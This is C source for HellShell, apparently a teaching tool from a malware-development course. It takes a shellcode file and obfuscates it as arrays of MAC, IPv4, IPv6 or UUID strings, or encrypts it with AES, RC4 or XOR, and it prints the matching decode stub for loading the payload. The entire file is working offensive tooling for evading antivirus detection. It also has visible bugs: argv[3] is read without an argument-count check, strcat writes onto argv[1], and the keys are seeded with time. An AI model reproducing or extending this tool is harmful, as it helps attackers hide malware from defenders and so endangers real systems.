#include <Windows.h>
#include <stdio.h>

#include "Common.h"

// in case we need to make the shellcode multiple of something, we use this function and we make it multiple of *MultipleOf* parameter
// return the base address and the size of the new payload (appeneded payload)
BOOL AppendInputPayload(IN INT MultipleOf, IN PBYTE pPayload, IN DWORD dwPayloadSize, OUT PBYTE* ppAppendedPayload, OUT DWORD* pAppendedPayloadSize) {
	
	PBYTE	Append			= NULL;
	DWORD	AppendSize		= NULL;
	
	// calculating new size
	AppendSize = dwPayloadSize + MultipleOf - (dwPayloadSize % MultipleOf);

	// allocating new payload buffer
	Append = (PBYTE)HeapAlloc(GetProcessHeap(), 0, AppendSize);
	if (Append == NULL)
		return FALSE;

	// filling all with nops
	memset(Append, 0x90, AppendSize);

	// copying the payload bytes over
	memcpy(Append, pPayload, dwPayloadSize);
	
	// returning
	*ppAppendedPayload = Append;
	*pAppendedPayloadSize = AppendSize;
	
	return TRUE;
}


// print help
INT PrintHelp(IN CHAR* _Argv0) {
	printf("\t\t\t ###########################################################\n");
	printf("\t\t\t # HellShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #\n");
	printf("\t\t\t ###########################################################\n\n");

	printf("[!] Usage: %s <Input Payload FileName> <Enc/Obf *Option*> [-savebin] \n", _Argv0);
	printf("[i] Options Can Be : \n");
	printf("\t1.>>> \"mac\"     ::: Output The Shellcode As An Array Of Mac Addresses  [FC-48-83-E4-F0-E8]\n");
	printf("\t2.>>> \"ipv4\"    ::: Output The Shellcode As An Array Of Ipv4 Addresses [252.72.131.228]\n");
	printf("\t3.>>> \"ipv6\"    ::: Output The Shellcode As An Array Of Ipv6 Addresses [FC48:83E4:F0E8:C000:0000:4151:4150:5251]\n");
	printf("\t4.>>> \"uuid\"    ::: Output The Shellcode As An Array Of UUid Strings   [FC4883E4-F0E8-C000-0000-415141505251]\n");
	printf("\t5.>>> \"aes\"     ::: Output The Shellcode As An Array Of Aes Encrypted Shellcode With Random Key And Iv\n");
	printf("\t6.>>> \"rc4\"     ::: Output The Shellcode As An Array Of Rc4 Encrypted Shellcode With Random Key\n");
	printf("\t7.>>> \"xor\"     ::: Output The Shellcode As An Array Of Xor Encrypted Shellcode With Random Key\n");
	printf("\t8.>>> \"plain\"     ::: Output The Shellcode As An Array Of Plain Shellcode\n");

	return -1;

}


int main(int argc, char* argv[]) {

	// data to help us in dealing with user's input
	DWORD	dwType				= NULL;
	BOOL	bSupported			= FALSE;
	
	// variables used for holding data on the read payload 
	PBYTE	pPayloadInput		= NULL;
	DWORD	dwPayloadSize		= NULL;

	// just in case we needed to append out input payload:
	PBYTE	pAppendedPayload	= NULL;
	DWORD	dwAppendedSize		= NULL;

	// variables used for holding data on the encrypted payload (aes/rc4)
	PVOID	pCipherText			= NULL;
	DWORD	dwCipherSize		= NULL;

	// output text to be displayed
	PBYTE	pOutputText			= NULL;

	// checking input
	if (argc < 3)
		return PrintHelp(argv[0]);

	// reading input payload
	if (!ReadPayloadFile(argv[1], &dwPayloadSize, &pPayloadInput))
		return -1;

	// intialize the possible append variables, since later we will deal with these only to print (*GenerateXXXOutput* functions)
	pAppendedPayload	= pPayloadInput;
	dwAppendedSize		= dwPayloadSize;

	// if plain output is selected
	if (strcmp(argv[2], "plain") == 0)
	{
		if ((pOutputText = GeneratePlainOutput(pPayloadInput, dwPayloadSize)) == NULL)
			return -1;

		printf("%s\n", pOutputText);
	}

	// if mac fuscation is selected
	else if (strcmp(argv[2], "mac") == 0){
		// if payload isnt multiple of 6 we padd it
		if (dwPayloadSize % 6 != 0){
			if (!AppendInputPayload(6, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of mac addresses from new appended shellcode 
		if ((pOutputText = GenerateMacOutput(pAppendedPayload, dwAppendedSize)) == NULL) {
			return -1;
		}

		PrintDecodeFunctionality(MACFUSCATION);
		printf("%s\n", pOutputText);
	}

	else if (strcmp(argv[2], "ipv4") == 0){
		// if payload isnt multiple of 4 we padd it
		if (dwPayloadSize % 4 != 0) {
			if (!AppendInputPayload(4, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv4 addresses from new appended shellcode 
		if ((pOutputText = GenerateIpv4Output(pAppendedPayload, dwAppendedSize)) == NULL) {
			return -1;
		}

		PrintDecodeFunctionality(IPV4FUSCATION);
		printf("%s\n", pOutputText);
	}

	else if (strcmp(argv[2], "ipv6") == 0) {
		// if payload isnt multiple of 16 we padd it
		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv6 addresses from new appended shellcode 
		if ((pOutputText = GenerateIpv6Output(pAppendedPayload, dwAppendedSize)) == NULL) {
			return -1;
		}

		PrintDecodeFunctionality(IPV6FUSCATION);
		printf("%s\n", pOutputText);
	}

	else if (strcmp(argv[2], "uuid") == 0) {
		// if payload isnt multiple of 16 we padd it
		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}
		// generate array of uuid addresses from new appended shellcode 
		if ((pOutputText = GenerateUuidOutput(pAppendedPayload, dwAppendedSize)) == NULL){
			return -1;
		}

		PrintDecodeFunctionality(UUIDFUSCATION);
		printf("%s\n", pOutputText);
	}

	else if (strcmp(argv[2], "aes") == 0) {

		CHAR	KEY			[AESKEYSIZE], KEY2[AESKEYSIZE];
		CHAR	IV			[AESIVSIZE], IV2[AESIVSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, AESKEYSIZE);
		srand(time(NULL) ^ KEY[0]);
		GenerateRandomBytes(IV, AESIVSIZE);

		//saving the key and iv in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, AESKEYSIZE);
		memcpy(IV2, IV, AESIVSIZE);

		if (!SimpleEncryption(pPayloadInput, dwPayloadSize, KEY, IV, &pCipherText, &dwCipherSize)) {
			return -1;
		}

		// Print out the decryption code
		PrintDecodeFunctionality(AESENCRYPTION);
		PrintHexData("AesCipherText", pCipherText, dwCipherSize);
		PrintHexData("AesKey", KEY2, AESKEYSIZE);
		PrintHexData("AesIv", IV2, AESIVSIZE);
		printf("PVOID pShellcode = NULL; DWORD sShellcodeSize = NULL; SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pShellcode, &sShellcodeSize);\n");
		printf("HeapFree(GetProcessHeap(), 0, pShellcode);\n\nreturn 0;\n}");
	}

	else if (strcmp(argv[2], "rc4") == 0) {

		CHAR KEY [RC4KEYSIZE], KEY2[RC4KEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, RC4KEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, RC4KEYSIZE);

		if (!Rc4EncryptionViSystemFunc032(KEY, pPayloadInput, RC4KEYSIZE, dwPayloadSize)){
			return -1;
		}
		pCipherText = pPayloadInput;
		dwCipherSize = dwPayloadSize;

		PrintDecodeFunctionality(RC4ENCRYPTION);
		PrintHexData("Rc4CipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("Rc4Key", KEY2, RC4KEYSIZE);
		printf("PVOID pShellcode = NULL; DWORD sShellcodeSize = NULL; Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, 16, sizeof(Rc4CipherText));\n\n");
		printf("return 0;\n}");
		
	}

	else if (strcmp(argv[2], "xor") == 0) {

		CHAR KEY[XORKEYSIZE], KEY2[XORKEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, XORKEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, XORKEYSIZE);

		XorEncryption(pPayloadInput, dwPayloadSize, KEY, XORKEYSIZE);
		pCipherText = pPayloadInput;
		dwCipherSize = dwPayloadSize;

		PrintDecodeFunctionality(XORENCRYPTION);
		PrintHexData("XorCipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("XorKey", KEY2, XORKEYSIZE);
		printf("XorEncryption(XorCipherText, sizeof(XorCipherText), XorKey, 8);\n\n");
		printf("return 0;\n}");

	}

	else
	{
		printf("<<<!>>> \"%s\" Is not Valid Input <<<!>>>\n\n", argv[2]);
		return PrintHelp(argv[0]);
	}

	// Save the encrypted/obfuscated binary/bytes to file
	if (strcmp(argv[3], "-savebin") == 0)
	{
		PBYTE encryptedFilename = strcat(argv[1], ".enc");
		WritePayloadFile(encryptedFilename, dwCipherSize, pCipherText);
		printf("\n\n\nSaved the encrypted binary to %s!", encryptedFilename);
	}


	// printing some gap
	printf("\n\n");

	if (pPayloadInput != NULL)
		HeapFree(GetProcessHeap(), 0, pPayloadInput); 
	if (pCipherText != NULL && pCipherText != pPayloadInput)
		HeapFree(GetProcessHeap(), 0, pCipherText); 
	if (pAppendedPayload != NULL && pAppendedPayload != pPayloadInput)
		HeapFree(GetProcessHeap(), 0, pAppendedPayload); 
	return 0;
}








